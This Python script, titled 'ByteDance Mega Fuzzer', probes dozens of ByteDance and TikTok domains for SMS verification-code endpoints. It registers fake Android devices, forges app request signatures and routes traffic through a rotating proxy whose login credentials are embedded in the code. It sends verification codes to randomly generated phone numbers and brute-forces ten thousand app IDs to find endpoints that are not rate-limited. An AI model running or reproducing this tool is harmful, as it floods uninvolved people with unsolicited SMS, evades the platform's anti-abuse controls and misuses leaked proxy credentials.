#!/usr/bin/env python3
"""
ByteDance Mega Fuzzer v1.0
==========================
Phase 1: Domain Discovery — test all ByteDance domains with known working AIDs to find passport API hosts
Phase 2: Endpoint Discovery — test all passport endpoints on discovered domains
Phase 3: AID Brute Force 1-10000 on best domain+endpoint combos (signed + web)
"""
import requests, random, time, json, hashlib, uuid, urllib3, sys, os
from urllib.parse import urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from datetime import datetime

urllib3.disable_warnings()
from SignerPy import sign as sp_sign, xor

PROXY_TEMPLATE = 'http://user-2pbGchwGYvoGSTLv-type-datacenter-country-{region}:j8BogunPuMmSaOEU@geo.g-w.info:10080'
REGIONS = ["AU", "DE", "SG", "FR"]

# ============================================================
# ALL BYTEDANCE DOMAINS (from v2ray community list + research)
# ============================================================

# Category 1: Known API domains (already tested, for reference)
KNOWN_API_DOMAINS = [
    "api16-normal-c-useast2a.tiktokv.com", "api16-normal-v4.tiktokv.com",
    "api16-normal-v6.tiktokv.com", "api-t2.tiktokv.com",
    "api3-normal-c-lf.amemv.com", "api.amemv.com",
    "api5.pipix.com", "api3.pipix.com",
    "is.snssdk.com", "ib.snssdk.com", "aweme.snssdk.com",
    "verify.zijieapi.com",
    "www.tiktok.com", "us.tiktok.com", "www.capcut.com",
]

# Category 2: ByteDance Chinese app/website domains (NEW — never tested for passport)
CHINESE_WEBSITE_DOMAINS = [
    # Douyin ecosystem
    "www.douyin.com", "douyin.com", "api.douyin.com",
    "iesdouyin.com", "douyinec.com",
    # Toutiao ecosystem
    "www.toutiao.com", "toutiao.com", "toutiaoapi.com",
    "toutiaolite.com", "toutiaojisu.com",
    # Xigua Video
    "www.ixigua.com", "ixigua.com",
    # Lark / Feishu
    "www.feishu.cn", "feishu.cn", "www.larksuite.com",
    # Faceu / Ulike
    "faceu.com", "ulikecam.com",
    # Jianying (Chinese CapCut)
    "jianying.com", "www.jianying.com",
    # Pipix variations
    "pipixiaha.com", "hapipixia.com",
    # Baike (encyclopedia)
    "baike.com",
    # Wukong Q&A
    "wukong.com",
    # GoGoKid
    "gogokid.com",
    # Jinritemai (ecommerce)
    "jinritemai.com", "ecombdapi.com",
    # FQNovel
    "fqnovel.com",
    # Juejin (developer platform)
    "juejin.cn",
]

# Category 3: ByteDance infrastructure/API domains (NEW)
BYTEDANCE_INFRA_DOMAINS = [
    # ByteDance API
    "bytedanceapi.com", "byteapi.com",
    "bytexservice.com", "bytevcloudapi.com",
    # snssdk.com variations (some tested, adding remaining)
    "open.snssdk.com", "frontier.snssdk.com",
    "mon.snssdk.com", "i-hl.snssdk.com", "i-lq.snssdk.com",
    "is-hl.snssdk.com", "is-lq.snssdk.com",
    "sgsnssdk.com", "isnssdk.com", "tobsnssdk.com", "ctobsnssdk.com",
    # zijieapi.com variations
    "zijieapi.com", "zijieapi.cn", "zijieapi.net",
    "ads3-normal-lf.zijieapi.com", "ads3-normal.zijieapi.com",
    # pstatp.com (ByteDance stat/API)
    "pstatp.com", "ipstatp.com",
    # byteoversea (overseas API)
    "byteoversea.com", "ibytedtos.com",
    # volcengine
    "volcengine.com", "volcanicengine.com",
    # ByteDance core
    "bytedance.com", "bytedance.cn",
    # Ocean Engine (ad platform)
    "oceanengine.com",
]

# Category 4: TikTok ecosystem domains (NEW)
TIKTOK_ECOSYSTEM_DOMAINS = [
    # TikTok variations
    "api.tiktok.com", "m.tiktok.com",
    "ads.tiktok.com", "business.tiktok.com",
    "seller.tiktok.com", "shop.tiktok.com",
    "effecthouse.tiktok.com",
    # CapCut variations
    "api.capcut.com", "capcut.com",
    "lv.capcut.com",
    # Lemon8
    "www.lemon8-app.com", "lemon8-app.com",
    "api.lemon8-app.com",
    # Musical.ly legacy
    "api2-16-h2.musical.ly", "api2-19-h2.musical.ly",
    "musical.ly",
    # TikTok API variations
    "api16.tiktokv.com", "api19.tiktokv.com",
    "api21-normal-c-useast2a.tiktokv.com",
    "api22-normal-c-useast2a.tiktokv.com",
    "api-h2.tiktokv.com", "api-va.tiktokv.com",
    # Pangle (ad network)
    "pangleglobal.com",
]

# Category 5: CapCut specific domains
CAPCUT_DOMAINS = [
    "www.capcut.com", "capcut.com",
    "api.capcut.com", "lv.capcut.com",
    "capcutapi.com",
]

# ALL passport-related endpoints to test
ALL_ENDPOINTS = [
    "/passport/mobile/send_code/v1/",
    "/passport/mobile/send_code/",
    "/passport/web/send_code/",
    "/passport/open/send_code/",
    "/passport/mobile/send_code/v2/",
    "/passport/app/send_code/",
    "/passport/sms/send_code/",
    "/passport/email/send_code/",
    "/passport/token/send_code/",
    "/passport/auth/send_code/",
    "/passport/account/send_code/",
    "/passport/user/send_code/",
    "/passport/login/send_code/",
    "/passport/verify/send_code/",
]

# Probe AIDs (known working for quick domain testing)
PROBE_AIDS = [
    {"aid": 1128, "app_name": "aweme", "name": "Douyin"},
    {"aid": 1233, "app_name": "musical_ly", "name": "TikTok"},
    {"aid": 1319, "app_name": "super", "name": "Pipix"},
    {"aid": 1988, "app_name": "douyin_web", "name": "DouyinWeb"},
    {"aid": 1583, "app_name": "tiktok_web", "name": "TikTokAds"},
]

TC = [3532, 3635, 3637, 3634]

lock = threading.Lock()
results = {"success": [], "rate_limited": [], "ec16": [], "errors": [], "tested": 0,
           "working_domains": set(), "working_endpoints": set()}

def get_phone(region):
    pools = {"AU": "+614", "DE": "+4915", "SG": "+658", "FR": "+336", "US": "+1202"}
    prefix = pools.get(region, "+44770")
    return prefix + str(random.randint(1000000, 9999999))

def register_device(aid, app_name, proxy, domain="api3-normal-c-lf.amemv.com"):
    brands = [("Samsung","SM-G991B","13","33"), ("Google","Pixel 7","14","34"), ("Xiaomi","Redmi Note 12","13","33")]
    b, m, av, api = random.choice(brands)
    openudid = ''.join(random.choices('0123456789abcdef', k=16))
    cdid = str(uuid.uuid4()); ts = int(time.time())
    params = {"aid": str(aid), "app_name": app_name, "version_code": "350804",
              "version_name": "35.8.4", "device_platform": "android", "os": "android",
              "os_api": api, "os_version": av, "device_type": m, "device_brand": b,
              "language": "en", "ac": "wifi", "channel": "googleplay",
              "resolution": "1080*2400", "dpi": "420", "openudid": openudid,
              "cdid": cdid, "ts": str(ts), "_rticket": str(ts*1000)}
    body = json.dumps({"magic_tag": "ss_app_log", "header": {
        "display_name": f"App_{aid}", "update_version_code": 350804,
        "manifest_version_code": 350804, "aid": aid, "channel": "googleplay",
        "package": "com.zhiliaoapp.musically", "app_version": "35.8.4",
        "version_code": 350804, "sdk_version": "2.14.0-rc.8",
        "os": "Android", "os_version": av, "os_api": int(api), "device_model": m,
        "device_brand": b, "device_manufacturer": b, "cpu_abi": "arm64-v8a",
        "release_build": "f66b21c_20241009", "density_dpi": 420,
        "display_density": "xxhdpi", "resolution": "1080x2400", "language": "en",
        "timezone": 1, "access": "wifi", "cdid": cdid, "sig_hash": "aea615ab",
        "openudid": openudid, "clientudid": str(uuid.uuid4()), "region": "US"}, "_gen_ts": ts})
    url = f"https://{domain}/service/2/device_register/?{urlencode(params)}"
    ua = f"com.zhiliaoapp.musically/350804 (Linux; U; Android {av}; en_US; {m}; Build/TQ3A.230901.001)"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers={"Host": domain, "User-Agent": ua,
                   "Content-Type": "application/json"}, verify=False, timeout=10)
        if r.status_code == 200:
            d = r.json()
            if "device_id" in d and d["device_id"]:
                return {"device_id": str(d["device_id"]), "iid": str(d["install_id"]),
                        "brand": b, "model": m, "av": av, "api": api, "openudid": openudid,
                        "cdid": cdid, "ua": ua,
                        "odin_tt": ''.join(random.choices('0123456789abcdef', k=160)),
                        "csrf": ''.join(random.choices('0123456789abcdef', k=32))}
    except: pass
    finally: s.close()
    return None

def send_signed(domain, aid, app_name, phone, tc, proxy, dev, endpoint):
    encrypted = xor(phone)
    ts = int(time.time()); rticket = str(ts * 1000 + random.randint(1000, 9999))
    common = {"passport-sdk-version": "50559", "iid": dev["iid"], "device_id": dev["device_id"],
              "ac": "wifi", "channel": "googleplay", "aid": str(aid),
              "app_name": app_name, "version_code": "350804", "version_name": "35.8.4",
              "device_platform": "android", "os": "android", "ssmix": "a",
              "device_type": dev["model"], "device_brand": dev["brand"], "language": "en",
              "os_api": dev["api"], "os_version": dev["av"],
              "manifest_version_code": "350804", "resolution": "1080*2400", "dpi": "420",
              "update_version_code": "350804", "cdid": dev["cdid"], "carrier_region": "US"}
    url_p = dict(common); url_p["_rticket"] = rticket; url_p["ts"] = str(ts)
    body_p = dict(common)
    body_p.update({"auto_read": "0", "account_sdk_source": "app", "unbind_exist": "35",
                   "mix_mode": "1", "mobile": encrypted, "type": str(tc), "_rticket": rticket, "ts": str(ts)})
    url_str = urlencode(url_p); body = urlencode(body_p)
    cookies = f"odin_tt={dev['odin_tt']}; install_id={dev['iid']}; passport_csrf_token_default={dev['csrf']}"
    try:
        sigs = sp_sign(params=url_str, payload=body, cookie=cookies, version=8404, aid=aid)
    except: return None
    headers = {"Host": domain, "Cookie": cookies, "X-SS-REQ-TICKET": rticket,
               "sdk-version": "2", "passport-sdk-version": "50559",
               "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
               "X-SS-DP": str(aid), "User-Agent": dev["ua"],
               "X-Gorgon": sigs.get("x-gorgon",""), "X-Khronos": sigs.get("x-khronos",str(ts)),
               "X-Argus": sigs.get("x-argus",""), "X-Ladon": sigs.get("x-ladon",""),
               "X-SS-STUB": sigs.get("x-ss-stub", hashlib.md5(body.encode()).hexdigest().upper())}
    url = f"https://{domain}{endpoint}?{url_str}"
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=12)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": str(d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:60]}
    finally: s.close()

def send_web(domain, aid, app_name, phone, tc, proxy, endpoint):
    encrypted = ''.join(format(ord(c) ^ 5, '02x') for c in phone)
    body = urlencode({"mobile": encrypted, "type": str(tc), "aid": str(aid),
                      "app_name": app_name, "account_sdk_source": "web", "mix_mode": "1", "auto_read": "0"})
    url = f"https://{domain}{endpoint}?aid={aid}&app_name={app_name}"
    headers = {"Host": domain, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0 Safari/537.36",
               "Content-Type": "application/x-www-form-urlencoded", "Accept": "application/json",
               "Origin": f"https://{domain}", "Referer": f"https://{domain}/", "X-SS-DP": str(aid)}
    s = requests.Session(); s.proxies = {"http": proxy, "https": proxy}
    try:
        r = s.post(url, data=body, headers=headers, verify=False, timeout=12)
        d = r.json()
        return {"status": r.status_code, "msg": d.get("message",""),
                "ec": d.get("data",{}).get("error_code") if isinstance(d.get("data"),dict) else None,
                "desc": str(d.get("data",{}).get("description","") or "")[:80] if isinstance(d.get("data"),dict) else ""}
    except Exception as e: return {"status": -1, "msg": "error", "ec": -1, "desc": str(e)[:60]}
    finally: s.close()

def log_result(domain, aid, app_name, tc, region, endpoint, method, r):
    with lock:
        results["tested"] += 1
        if not r: return
        entry = {"domain": domain, "aid": aid, "app_name": app_name, "tc": tc,
                 "region": region, "endpoint": endpoint, "method": method,
                 "msg": r["msg"], "ec": r["ec"], "status": r["status"], "desc": r["desc"]}
        if r["msg"] == "success":
            results["success"].append(entry)
            results["working_domains"].add(domain)
            results["working_endpoints"].add(endpoint)
            print(f"\n  *** SUCCESS *** AID={aid} domain={domain} ep={endpoint} tc={tc} reg={region} method={method}")
        elif r["ec"] in (7, 1206):
            results["rate_limited"].append(entry)
            results["working_domains"].add(domain)
            results["working_endpoints"].add(endpoint)
        elif r["ec"] == 16:
            results["ec16"].append(entry)
        else:
            results["errors"].append(entry)
            if r["status"] != -1 and "Maximum number" not in str(r.get("desc","")) and r["ec"] not in (3052, 1105, 4044):
                print(f"\n  ?? AID={aid} ep={endpoint[:35]} dom={domain[:35]} ec={r['ec']} s={r['status']} desc={r['desc'][:40]}")
        if results["tested"] % 200 == 0:
            s = len(results["success"]); rl = len(results["rate_limited"])
            print(f"\r  [{results['tested']} done] S:{s} RL:{rl} ec16:{len(results['ec16'])} err:{len(results['errors'])}     ", end="", flush=True)

def test_domain_web(domain, aid_info, tc, region, endpoint):
    proxy = PROXY_TEMPLATE.format(region=region)
    phone = get_phone(region)
    r = send_web(domain, aid_info["aid"], aid_info["app_name"], phone, tc, proxy, endpoint)
    log_result(domain, aid_info["aid"], aid_info["name"], tc, region, endpoint, "web", r)

def test_domain_signed(domain, aid_info, tc, region, endpoint):
    proxy = PROXY_TEMPLATE.format(region=region)
    phone = get_phone(region)
    dev = register_device(aid_info["aid"], aid_info["app_name"], proxy)
    if dev:
        r = send_signed(domain, aid_info["aid"], aid_info["app_name"], phone, tc, proxy, dev, endpoint)
        log_result(domain, aid_info["aid"], aid_info["name"], tc, region, endpoint, "signed", r)

def test_aid_web(domain, aid, tc, region, endpoint):
    proxy = PROXY_TEMPLATE.format(region=region)
    phone = get_phone(region)
    r = send_web(domain, aid, "tiktok_web", phone, tc, proxy, endpoint)
    log_result(domain, aid, f"AID_{aid}", tc, region, endpoint, "web_brute", r)

def test_aid_signed(domain, aid, tc, region, endpoint):
    proxy = PROXY_TEMPLATE.format(region=region)
    phone = get_phone(region)
    dev = register_device(aid, "musical_ly", proxy)
    if dev:
        r = send_signed(domain, aid, "musical_ly", phone, tc, proxy, dev, endpoint)
        log_result(domain, aid, f"AID_{aid}", tc, region, endpoint, "signed_brute", r)

def save_results(filename):
    data = dict(results)
    data["working_domains"] = list(data["working_domains"])
    data["working_endpoints"] = list(data["working_endpoints"])
    with open(filename, "w") as f:
        json.dump(data, f, indent=2, default=str)
    print(f"\n  Saved to {filename}")

def phase1_domain_discovery():
    """Test ALL new ByteDance domains with known working AIDs to find which serve passport API"""
    print("\n" + "="*70)
    print("PHASE 1: DOMAIN DISCOVERY — Testing all ByteDance domains")
    print("="*70)

    all_new_domains = list(set(CHINESE_WEBSITE_DOMAINS + BYTEDANCE_INFRA_DOMAINS + TIKTOK_ECOSYSTEM_DOMAINS + CAPCUT_DOMAINS))
    # Remove already known working domains
    all_new_domains = [d for d in all_new_domains if d not in KNOWN_API_DOMAINS]

    # Key endpoints to test
    key_endpoints = ["/passport/mobile/send_code/v1/", "/passport/web/send_code/", "/passport/open/send_code/"]

    tasks = []
    for domain in all_new_domains:
        for probe in PROBE_AIDS[:3]:  # Test with Douyin, TikTok, Pipix
            for ep in key_endpoints:
                tc = random.choice(TC)
                region = random.choice(REGIONS)
                # Web test (fast, no device registration)
                tasks.append(("web", domain, probe, tc, region, ep))
        # Also one signed test per domain with Douyin
        tasks.append(("signed", domain, PROBE_AIDS[0], random.choice(TC), random.choice(REGIONS), "/passport/mobile/send_code/v1/"))

    random.shuffle(tasks)
    print(f"  {len(all_new_domains)} new domains × {len(PROBE_AIDS[:3])} AIDs × {len(key_endpoints)} endpoints = {len(tasks)} tests")

    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = []
        for method, domain, probe, tc, region, ep in tasks:
            if method == "web":
                futures.append(ex.submit(test_domain_web, domain, probe, tc, region, ep))
            else:
                futures.append(ex.submit(test_domain_signed, domain, probe, tc, region, ep))
        for f in as_completed(futures): f.result()

    save_results("/home/ubuntu/fuzzer_phase1_results.json")
    print(f"\n  Phase 1 complete: {len(results['working_domains'])} working domains found")
    return results["working_domains"].copy()

def phase2_endpoint_discovery(working_domains):
    """Test all passport endpoints on discovered working domains"""
    print("\n" + "="*70)
    print("PHASE 2: ENDPOINT DISCOVERY — Testing all endpoints on working domains")
    print("="*70)

    # Combine newly found + known working domains
    all_working = list(working_domains | set(KNOWN_API_DOMAINS))

    tasks = []
    for domain in all_working:
        for ep in ALL_ENDPOINTS:
            for probe in PROBE_AIDS[:2]:
                tc = random.choice(TC)
                region = random.choice(REGIONS)
                tasks.append(("web", domain, probe, tc, region, ep))

    random.shuffle(tasks)
    print(f"  {len(all_working)} domains × {len(ALL_ENDPOINTS)} endpoints × {len(PROBE_AIDS[:2])} AIDs = {len(tasks)} tests")

    with ThreadPoolExecutor(max_workers=15) as ex:
        futures = [ex.submit(test_domain_web, d, p, tc, reg, ep) for method, d, p, tc, reg, ep in tasks]
        for f in as_completed(futures): f.result()

    save_results("/home/ubuntu/fuzzer_phase2_results.json")
    print(f"\n  Phase 2 complete: {len(results['working_endpoints'])} working endpoints found")
    return results["working_endpoints"].copy()

def phase3_aid_bruteforce(working_domains, working_endpoints):
    """AID 1-10000 brute force on best domain+endpoint combos"""
    print("\n" + "="*70)
    print("PHASE 3: AID BRUTE FORCE 1-10000")
    print("="*70)

    # Pick best domains and endpoints
    best_domains_web = ["www.tiktok.com", "us.tiktok.com", "www.capcut.com"]
    best_domains_signed = ["api16-normal-c-useast2a.tiktokv.com", "api16-normal-v6.tiktokv.com"]

    # Add newly discovered working domains
    for d in working_domains:
        if d not in best_domains_web and d not in best_domains_signed and d not in KNOWN_API_DOMAINS:
            best_domains_web.append(d)

    best_ep_web = "/passport/web/send_code/"
    best_ep_signed = "/passport/mobile/send_code/v1/"

    # Add discovered endpoints
    for ep in working_endpoints:
        if ep not in (best_ep_web, best_ep_signed):
            pass  # We'll use the main ones for brute force

    # Phase 3a: Web brute force (fast, no signing)
    print(f"\n  Phase 3a: Web AID brute force on {best_domains_web[:3]}")
    tasks = []
    for aid in range(1, 10001):
        domain = random.choice(best_domains_web[:3])
        tc = random.choice(TC[:2])
        region = random.choice(REGIONS)
        tasks.append((domain, aid, tc, region, best_ep_web))

    random.shuffle(tasks)
    print(f"  10000 AIDs × web endpoint = {len(tasks)} tests")

    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = [ex.submit(test_aid_web, d, aid, tc, reg, ep) for d, aid, tc, reg, ep in tasks]
        for f in as_completed(futures): f.result()

    save_results("/home/ubuntu/fuzzer_phase3a_results.json")

    # Phase 3b: Signed brute force on tiktokv.com (slower but more thorough)
    print(f"\n  Phase 3b: Signed AID brute force on {best_domains_signed[:2]}")
    tasks = []
    for aid in range(1, 10001):
        domain = random.choice(best_domains_signed)
        tc = random.choice(TC[:2])
        region = random.choice(REGIONS)
        tasks.append((domain, aid, tc, region, best_ep_signed))

    random.shuffle(tasks)
    print(f"  10000 AIDs × signed endpoint = {len(tasks)} tests")

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = [ex.submit(test_aid_signed, d, aid, tc, reg, ep) for d, aid, tc, reg, ep in tasks]
        for f in as_completed(futures): f.result()

    save_results("/home/ubuntu/fuzzer_phase3b_results.json")

def print_summary():
    print("\n" + "="*70)
    print("MEGA FUZZER SUMMARY")
    print("="*70)
    print(f"Total tests: {results['tested']}")
    print(f"\nSUCCESSES ({len(results['success'])}):")
    for s in results["success"]:
        print(f"  AID={s['aid']:6} {s['app_name']:15} dom={s['domain']:40} ep={s['endpoint']:35} tc={s['tc']} reg={s['region']} method={s['method']}")
    print(f"\nRATE LIMITED ({len(results['rate_limited'])}):")
    rl_groups = {}
    for r in results["rate_limited"]:
        k = f"AID={r['aid']} ep={r['endpoint']}"
        if k not in rl_groups: rl_groups[k] = {"domains": set(), "regions": set()}
        rl_groups[k]["domains"].add(r["domain"]); rl_groups[k]["regions"].add(r["region"])
    for k, info in sorted(rl_groups.items()):
        print(f"  {k}: {len(info['domains'])} domains, regions={info['regions']}")
    print(f"\nWORKING DOMAINS ({len(results['working_domains'])}):")
    for d in sorted(results["working_domains"]):
        print(f"  {d}")
    print(f"\nWORKING ENDPOINTS ({len(results['working_endpoints'])}):")
    for e in sorted(results["working_endpoints"]):
        print(f"  {e}")
    save_results("/home/ubuntu/fuzzer_final_results.json")

def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    start = time.time()
    print(f"ByteDance Mega Fuzzer v1.0 — Started {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

    if mode in ("all", "phase1"):
        working_domains = phase1_domain_discovery()
    else:
        working_domains = set()

    if mode in ("all", "phase2"):
        working_endpoints = phase2_endpoint_discovery(working_domains)
    else:
        working_endpoints = set()

    if mode in ("all", "phase3"):
        phase3_aid_bruteforce(working_domains, working_endpoints)

    print_summary()
    elapsed = time.time() - start
    print(f"\nTotal time: {elapsed:.0f}s ({elapsed/60:.1f}min)")

if __name__ == "__main__":
    main()
